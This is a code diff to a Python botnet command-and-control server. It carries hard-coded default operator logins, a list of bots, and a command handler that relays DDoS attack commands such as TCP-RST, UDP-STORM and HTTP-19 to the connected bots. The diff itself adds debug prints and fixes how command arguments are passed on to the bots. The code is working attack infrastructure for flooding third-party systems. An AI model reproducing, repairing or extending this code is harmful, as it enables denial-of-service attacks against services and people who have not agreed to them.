@@ -4,7 +4,7 @@ from clients.banner import create_banner,create_HELP,banner_meth
 login = [['ROOT','ROOT'],['ADMIN','ADMIN'],['HEX','HEX']]
 
 def random_unique(length):
- return ''.join([random.choice(string.ascii_letters+string.digits+'_.-+=,:;|!@$%^&*()<>?/\\]}{[') for _ in range(length)])
+ return ''.join([random.choice(string.ascii_letters+string.digits+'_.-+=,:;|!@$%^&*()<>?/]}{[') for _ in range(length)])
 
 bots = []
 
@@ -68,6 +68,8 @@ def handshake_botnet(s, ip):
         else:
          c = 0
          if len(bots) > 0:
+          print('yes')
+          print(bots)
           for a in bots:
            if ip[0] != a[2]:c = 1; break
            else:c = 0
@@ -104,14 +106,15 @@ def bot_sent(com):
       except:pass
   return message
 
-def command(com):
+def command(com,mode=1):
   length = []
-  total = 1
+  total = mode
   while True:
     try:
       length.append(com[total])
       total += 1
     except:break
+  return length
 
 def sent_packet(length,s):
   for a in bot_sent(' '.join(length)):
@@ -134,10 +137,10 @@ def client_command(s,u):
       if com[0] in ['CLS','CLEAR']:s.send(b'\033[2J\033[H')
       elif com[0] in ['TCP-RST','TCP_RESET','TCP_RST','TCP-RESET','UDP-STORM','UDPSTORM','UDP_STORM','HTTP-19','HTTP','H19','HTTP_19','STOP','END-ATTACK','END_ATTACK','END-ATK','CLOSE-ATK','CLOSE-ATTACK']:
        if len(com) != 1:
-         all_com = command(com)
+         all_com = command(com,mode=0)
          sent_packet(all_com,s)
        else:
-         sent_packet(com[0],s)
+         sent_packet(com,s)
       elif com[0] == 'BOTS':
         if len(com) != 1:
          all_com = command(com)
